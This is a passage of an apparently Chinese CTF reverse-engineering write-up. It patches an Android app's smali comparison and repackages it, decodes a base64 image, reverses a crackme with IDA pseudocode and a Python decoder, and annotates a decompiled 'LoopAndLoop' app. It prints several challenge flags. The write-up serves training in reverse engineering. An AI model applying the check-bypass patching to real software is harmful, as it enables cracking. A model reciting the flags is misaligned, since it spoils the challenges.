<p>发现这里是反过来的,下一步把 <code>&gt;</code> 改成 <code>&lt;=</code> </p>
<p>将<code>if-gtz v0, :cond_0</code>修改为<code>if-lez v0, :cond_0</code>  </p>
<blockquote>
<p><img src="https://i.loli.net/2019/04/10/5cadd8f83b3c1.png" alt="小于.png"></p>
</blockquote>
</blockquote>
</li>
<li><p>编译打包程序  </p>
<blockquote>
<p>在编译的时候遇到以下问题<br> &gt;&gt;Project\res\values-v23\styles.xml:6: error: Error retrieving  parent for item: No resource found that matches the given name  ‘@android:style/WindowTitleBackground’.<br> &gt;&gt;<br> &gt;&gt;Project\res\values-v23\styles.xml:6: error: Error retrieving  parent for item: No resource found that matches the given name  ‘@android:style/WindowTitleBackground’.</p>
</blockquote>
</li>
<li><p>解决方法</p>
<blockquote>
<p>找到res/value-v23/styles.xml，把resources下的东西注释掉  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt; &lt;resources&gt;</span><br><span class="line">&gt; &lt;!--</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; --&gt;</span><br><span class="line">&gt; &lt;/resources&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>&gt; 找到res/value/public.xml，把所有带Base.V23的东西（两个）注释掉  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt; &lt;resources&gt;</span><br><span class="line">&gt; &lt;!--</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; --&gt;</span><br><span class="line">&gt; &lt;/resources&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>重新编译打包  </p>
<p><img src="https://i.loli.net/2019/04/10/5cadeb314bca4.png" alt="编译成功.png"></p>
</li>
</ul>
<h3 id="模拟器载入新安装包"><a href="#模拟器载入新安装包" class="headerlink" title="模拟器载入新安装包"></a>模拟器载入新安装包</h3><ul>
<li><p>成功获取flag</p>
<p><img src="https://i.loli.net/2019/04/10/5cadebc91d750.png" alt="flag.png"></p>
</li>
<li><p>flag<br> <code>flag{Y0vAr3TimerMa3te7}</code></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>环境问题</p>
<blockquote>
<p>Android Killer编译apk始终失败  </p>
<blockquote>
<p>通过换jdk7以及修改res/xml成功编译  </p>
</blockquote>
<p>运行Jeb闪退  </p>
<blockquote>
<p>修改jeb_winos.bat,替换java版本<br> <img src="https://i.loli.net/2019/04/10/5cadee07e601d.png" alt="java版本.png">  </p>
</blockquote>
</blockquote>
</li>
<li><p>技术问题  </p>
<blockquote>
<p>不懂smati语言,但是Jeb和AK自身的伪代码转义功能较强,还是可以看懂程序流程 </p>
<p>下来需要潜心学习smati语法</p>
<p>本例程序代码量很少,遇到大型程序不会这么简单  </p>
</blockquote>
</li>
</ul>
<h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"><span class="function">bool <span class="title">is2</span><span class="params">(<span class="keyword">int</span> arg4)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        bool v1 = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg4 &gt; <span class="number">3</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg4 % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; arg4 % <span class="number">3</span> != <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> v0 = <span class="number">5</span>;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v0 * v0 &lt;= arg4) </span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(arg4 % v0 != <span class="number">0</span> &amp;&amp; arg4 % (v0 + <span class="number">2</span>) != <span class="number">0</span>) </span><br><span class="line">                        &#123;</span><br><span class="line">                            v0 += <span class="number">6</span>;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> </span><br><span class="line">                        <span class="keyword">return</span> v1;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v1 = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(arg4 &lt;= <span class="number">1</span>) </span><br><span class="line">            v1 = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> time = <span class="number">200000</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(time &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(is2(time))</span><br><span class="line">                k+=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                k--;  </span><br><span class="line">        time--;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">"k="</span> &lt;&lt; k &lt;&lt; endl ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h2><p>发现不是有效的<strong>pe</strong>文件，用<strong>VisualStudio Code</strong>打开试试,发现是<strong>“image/png；base64”</strong>，猜测是经过<strong>base64</strong>加密的图片，将整段内容复制下来，<strong>base64</strong>转图片</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/Bugku/Re/index.png" alt></p>
<p>扫描二维码，得到flag：<strong>bugku{inde_9882ihsd8-0}</strong> </p>
<h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>盲猜flag：I love you，算了不说笑了，还是真实做题吧</p>
<p>载入OD</p>
<p>搜索字符串</p>
<p><img src="https://img-blog.csdn.net/20171228160459980" alt="img"></p>
<p>随意输入1111111111111111111</p>
<p><img src="https://img-blog.csdn.net/20171228160500294" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20171228160501460" alt="img"></p>
<p>发现进行了base64加密</p>
<p>再向下单步 发现、</p>
<p><img src="https://img-blog.csdn.net/20171228160502178" alt="img"></p>
<p>结合IDA看下</p>
<p><img src="https://img-blog.csdn.net/20171228160503183" alt="img"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4156E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v0;<span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line">constchar*v1;<span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v2;<span class="comment">// eax@9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v4;<span class="comment">// [sp+0h] [bp-188h]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v5;<span class="comment">// [sp+Ch] [bp-17Ch]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v6;<span class="comment">// [sp+10h] [bp-178h]@3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> j;<span class="comment">// [sp+DCh] [bp-ACh]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> i;<span class="comment">// [sp+E8h] [bp-A0h]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Dest[<span class="number">108</span>];<span class="comment">// [sp+F4h] [bp-94h]@5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Str;<span class="comment">// [sp+160h] [bp-28h]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v11;<span class="comment">// [sp+17Ch] [bp-Ch]@6</span></span><br><span class="line"></span><br><span class="line">unsignedint v12;<span class="comment">// [sp+184h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> savedregs;<span class="comment">// [sp+188h] [bp+0h]@1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v5,<span class="number">0xCC</span>u,<span class="number">0x17C</span>u);</span><br><span class="line"></span><br><span class="line">v12 =(unsignedint)&amp;savedregs ^ __security_cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( i =<span class="number">0</span>;(signedint)i &lt;<span class="number">100</span>;++i )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">v6 = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( i &gt;=<span class="number">0x64</span>)</span><br><span class="line"></span><br><span class="line">sub_411154();</span><br><span class="line"></span><br><span class="line">Dest[v6]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"please enter the flag:"</span>, v4);</span><br><span class="line"></span><br><span class="line">sub_411375(<span class="string">"%20s"</span>,(unsignedint)&amp;Str);</span><br><span class="line"></span><br><span class="line">v0 = j_strlen(&amp;Str);</span><br><span class="line"></span><br><span class="line">v1 =(constchar*)sub_4110BE(&amp;Str, v0,&amp;v11);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(Dest, v1,<span class="string">'('</span>);</span><br><span class="line"></span><br><span class="line">sub_411127();</span><br><span class="line"></span><br><span class="line">i = j_strlen(Dest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( j =<span class="number">0</span>;(signedint)j &lt;(signedint)i;++j )</span><br><span class="line"></span><br><span class="line">Dest[j]+= j;</span><br><span class="line"></span><br><span class="line">v2 = j_strlen(Dest);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncmp</span>(Dest, Str2, v2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( sub_411127())</span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"wrong flag!\n"</span>, v4);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"rigth flag!\n"</span>, v4);</span><br><span class="line"></span><br><span class="line">sub_41126C(&amp;savedregs,&amp;dword_415890);</span><br><span class="line"></span><br><span class="line">sub_411280();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sub_411127();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知:将输入的串<strong>Str1</strong>先进行<strong>base64</strong>加密 再与串<strong>Str2</strong>比较 若相等 则输出<strong>“right flag”</strong></p>
<p>由此，我们只需将<strong>Str2</strong>也就是<strong>“e3nifIH9b_C@n@dH”</strong>进行解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s =<span class="string">"e3nifIH9b_C@n@dH"</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"></span><br><span class="line">flag += chr(ord(s[i])- i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>最后拿到答案<strong>flag{i_l0ve_you}</strong></p>
<h2 id="LoopAndLoop"><a href="#LoopAndLoop" class="headerlink" title="LoopAndLoop"></a>LoopAndLoop</h2><p>载入JEB，双击<strong>MainActivity</strong>，选择<strong>Decompilea class</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;  <span class="comment">// System.loadLibrary()是我们在使用Java的JNI机制时，会用到的一个非常重要的函数</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"lhm"</span>);  <span class="comment">// 它的作用即是把我们在Java code中声明的native方法的那个libraryload进来，或者load其他什么动态连接库</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">chec</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;  <span class="comment">// native层的chec方法</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// check方法将我们的输入和一个int型变量s返回到chec</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(input, s);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// check1定义v1为我们的输入，v0为循环变量1</span></span><br><span class="line">        <span class="keyword">int</span> v1 = input;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    label_2:  <span class="comment">// 进入到label_2</span></span><br><span class="line">        <span class="keyword">if</span>(v0 &lt; <span class="number">100</span>) &#123;</span><br><span class="line">            v1 += v0;  <span class="comment">// 先判断v0是否小于100，如果成立，那么v1每次加上v0的值</span></span><br><span class="line">            ++v0;  <span class="comment">// v0每次也要自增1</span></span><br><span class="line">            goto label_2;  <span class="comment">// 直接走向label_2</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(v1, s);  <span class="comment">// 还是将得到的v1及s返回给chec方法</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// 和上面的check与check1一样，都是需要两个参数，一个是我们的输入，一个是s</span></span><br><span class="line">        <span class="keyword">int</span> v2;  <span class="comment">// v2还是作为chec方法的返回值</span></span><br><span class="line">        <span class="keyword">int</span> v3 = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">int</span> v1 = input;  <span class="comment">// 定义三个int型变量，v1还是我们的输入，v3做为定值1000，而v2作为返回值(相当于一个标志)</span></span><br><span class="line">        <span class="keyword">if</span>(s % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> v0;  <span class="comment">// 当s对2取余等于0，也就是说s能被2整除时，定义一个新的循环变量v0</span></span><br><span class="line">            <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; v3; ++v0) &#123;</span><br><span class="line">                v1 += v0;  <span class="comment">// v0等于1，当小于v3的值也就是小于1000时，v1每次加上v0，v0++</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            v2 = <span class="keyword">this</span>.chec(v1, s);  <span class="comment">// v2还是作为chec方法的返回值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; v3; ++v0) &#123;<span class="comment">//如果取余不等于0，那么还是和上边一样，只不过v1每次减去v0</span></span><br><span class="line">                v1 -= v0;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            v2 = <span class="keyword">this</span>.chec(v1, s);<span class="comment">//chec方法的返回值</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> v2;<span class="comment">//返回v2</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;<span class="comment">//check3将输入给v1，将循环变量v0初值设为1，当v0小于10000，v1每次加上v0,而v0循环一次就加1</span></span><br><span class="line">        <span class="keyword">int</span> v1 = input;</span><br><span class="line">        <span class="keyword">int</span> v0;</span><br><span class="line">        <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; <span class="number">10000</span>; ++v0) &#123;</span><br><span class="line">            v1 += v0;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(v1, s);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">messageMe</span><span class="params">(String text)</span> </span>&#123;<span class="comment">//messageMe方法是返回字符串"LoopOk"+text</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"LoopOk"</span> + text;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;<span class="comment">//关键的方法onCreate</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">2130968600</span>);<span class="comment">//这两行和布局有关，不用管</span></span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">2131492946</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;<span class="comment">//最最重要的,从名字就可以看出，当我们点击GETYOURFLAG！这个按钮时触发的onClick</span></span><br><span class="line">                <span class="keyword">int</span> v1;</span><br><span class="line">                String v2 = <span class="keyword">this</span>.val$ed.getText().toString();<span class="comment">//v2获取我们的输入并转成字符串</span></span><br><span class="line">                <span class="keyword">try</span> &#123;										  <span class="comment">//下边这个try,catch用来捕获将类型异常</span></span><br><span class="line">                    v1 = Integer.parseInt(v2);<span class="comment">//将v2这个String字符类型数据转换为Integer整型数据赋值给v1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NumberFormatException v0) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"Not a Valid Integer number"</span>);<span class="comment">//如果不可以转成整数，就在屏幕打印"不是一个有效的整数"</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.check(v1, <span class="number">99</span>) == <span class="number">1835996258</span>) &#123;<span class="comment">//如果我们输入的v1和s也就是99传给check方法，</span></span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"The flag is:"</span>);<span class="comment">//接着传向chec方法得到的返回值等于1835996258，就输出flag</span></span><br><span class="line">                    <span class="keyword">this</span>.val$tv2.setText(<span class="string">"alictf&#123;"</span> + MainActivity.<span class="keyword">this</span>.stringFromJNI2(v1) + <span class="string">"&#125;"</span>);<span class="comment">//括号内是native层stringFromJNI2()方法处理v1后的</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"Not Right!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getMenuInflater().inflate(<span class="number">2131558400</span>, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> v1 = item.getItemId() == <span class="number">2131492961</span> ? <span class="keyword">true</span> : <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI2</span><span class="params">(<span class="keyword">int</span> arg1)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过分析可知重要的<strong>chec</strong>和<strong>stringFromJNI2</strong>都在<strong>native</strong>层，那么就需要将<strong>liblhm.so</strong>文件载入<strong>IDA</strong>进行分析，载入后直接<strong>shift+F12</strong>搜索字符串双击<strong>MainActivity</strong>进入，接着找到引用</p>
<p>在按<strong>F5</strong>就可以将<strong>chec</strong>反汇编成伪代码了 经过分析 可以知道<strong>chec</strong>方法根据第二个参数乘2对3取模的结果调用<strong>Java</strong>层的三个<strong>check</strong>函数对我们的输入进行处理所以我们只需要写脚本将算法逆过来就好</p>
